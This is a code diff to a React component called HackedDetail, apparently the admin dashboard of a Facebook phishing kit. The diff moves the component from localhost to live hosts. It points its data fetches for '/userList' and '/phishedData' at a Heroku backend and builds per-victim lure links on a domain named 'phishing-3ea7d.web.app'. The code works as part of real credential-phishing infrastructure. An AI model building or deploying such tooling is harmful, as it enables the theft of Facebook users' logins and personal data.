@@ -6,7 +6,7 @@ const HackedDetail = ({keyValue}) => {
   const [phishData, setPhishData] = useState([]);
   
   useEffect(() => {
-    fetch("http://localhost:5000/userList", {
+    fetch("https://ancient-garden-81797.herokuapp.com/userList", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -21,12 +21,12 @@ const HackedDetail = ({keyValue}) => {
 
 
   const handelLink = (id) => {
-    const finalLink = `http://localhost:3000/facebook?id=${id}`;
+    const finalLink = `https://phishing-3ea7d.web.app/facebook?id=${id}`;
     setLink(finalLink);
   };
 
   useEffect(() => {
-    fetch('http://localhost:5000/phishedData',{
+    fetch('https://ancient-garden-81797.herokuapp.com/phishedData',{
         method:'POST',
         headers: {
             'Content-Type':'application/json'
